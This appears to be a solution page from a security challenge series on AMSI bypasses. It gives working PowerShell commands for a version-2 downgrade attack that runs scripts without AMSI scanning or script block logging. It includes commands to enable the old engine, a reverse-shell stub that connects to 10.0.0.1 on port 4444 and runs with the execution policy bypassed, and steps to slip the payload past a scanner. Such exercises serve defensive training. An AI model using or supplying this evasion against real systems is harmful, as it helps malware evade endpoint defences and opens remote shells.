---
title: "Solution 33: PowerShell Downgrade Attack (PSv2)"
challenge_number: 33
difficulty: easy
category: "AMSI Bypass"
permalink: /solutions/33-powershell-downgrade/
---

# Solution: PowerShell Downgrade Attack (PSv2)

[Back to Challenge](../challenges/33-powershell-downgrade.md)

## Overview

Launch PowerShell version 2.0, which predates the AMSI framework entirely. AMSI was introduced in Windows 10 / PowerShell 5.0, so PSv2 has no AMSI integration whatsoever — there is literally no code path that calls `AmsiScanBuffer`.

## Working Code

### Basic Downgrade

```powershell
# Launch PowerShell v2 with an inline command
powershell.exe -Version 2 -Command "Write-Host 'Running in PSv2 - no AMSI here'"

# Launch PowerShell v2 with a script file
powershell.exe -Version 2 -File .\payload.ps1

# Launch an interactive PSv2 session
powershell.exe -Version 2
```

### Verify Version Inside the Session

```powershell
powershell.exe -Version 2 -Command "$PSVersionTable.PSVersion"
# Output:
# Major  Minor  Build  Revision
# -----  -----  -----  --------
# 2      0      -1     -1
```

### Execute a Full Payload via PSv2

```powershell
# Payload that would be blocked by AMSI in PSv5+
$payload = @'
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1", 4444)
$stream = $client.GetStream()
# ... reverse shell logic ...
Write-Host "malware payload executed without AMSI interference"
'@

# Save to file and execute in PSv2
Set-Content -Path "payload.ps1" -Value $payload
powershell.exe -Version 2 -ExecutionPolicy Bypass -File .\payload.ps1
```

### Check Prerequisites

```powershell
# Check if .NET 3.5 (required for PSv2) is installed
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root

# If not installed (requires admin):
Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

# Alternative check via registry
Test-Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine"
```

## Why It Works

### AMSI Timeline

| PowerShell Version | AMSI Support | Windows Version |
|---|---|---|
| 2.0 | None | Win 7/8 era |
| 3.0 | None | Win 8 |
| 4.0 | None | Win 8.1 |
| 5.0+ | Full | Win 10+ |

PowerShell v2 was built before AMSI existed. Its engine (`System.Management.Automation.dll` v2) contains:
- No `AmsiUtils` class
- No `AmsiScanBuffer` calls
- No script block logging
- No constrained language mode enforcement

When you specify `-Version 2`, Windows launches the PSv2 engine side-by-side. It's not emulation — it's literally the old engine binary running natively.

### Why It's Still Available

Microsoft kept PSv2 available for backward compatibility. Many enterprise scripts depended on PSv2-specific behaviors. The feature is "deprecated" but still present and functional on most Windows 10/11 systems if .NET Framework 3.5 is installed.

### Prerequisite: .NET Framework 3.5

PSv2 runs on the .NET 2.0 CLR (which ships as part of .NET 3.5). On modern Windows:
- .NET 3.5 is an optional Windows feature
- It may already be installed on enterprise systems
- It can be installed without admin if the components are cached

If .NET 3.5 is NOT available, the `-Version 2` flag will produce:
```
Version v2.0 of the .NET Framework is not installed and it is required to run version 2 of Windows PowerShell.
```

## How to Verify

1. Check if PSv2 is available on the system:
   ```powershell
   powershell.exe -Version 2 -Command "Write-Host 'PSv2 is available'"
   ```
   If this prints the message, PSv2 works.

2. Confirm the version number:
   ```powershell
   powershell.exe -Version 2 -Command "$PSVersionTable.PSVersion.Major"
   # Output: 2
   ```

3. Confirm AMSI is absent by checking for the AmsiUtils type:
   ```powershell
   powershell.exe -Version 2 -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
   # Output: (empty/null - the type doesn't exist in PSv2)
   ```

4. Execute a string that would be caught by AMSI in PSv5+:
   ```powershell
   powershell.exe -Version 2 -Command "Write-Host 'Invoke-Mimikatz malware test string'"
   ```
   This executes without interference.

5. Compare with PSv5 where AMSI would block it:
   ```powershell
   powershell.exe -Version 5 -Command "Write-Host 'Invoke-Mimikatz malware test string'"
   # May be blocked by AMSI provider (e.g., Windows Defender)
   ```

6. For our scanner context: save a script that uses `-Version 2` to invoke the payload. The parent script is clean, and the child PSv2 process has no AMSI:
   ```powershell
   Set-Content -Path "downgrade.ps1" -Value 'Start-Process powershell.exe -ArgumentList "-Version 2 -Command `"Write-Host malware`""'
   nim_antimalware_sim.exe downgrade.ps1
   ```
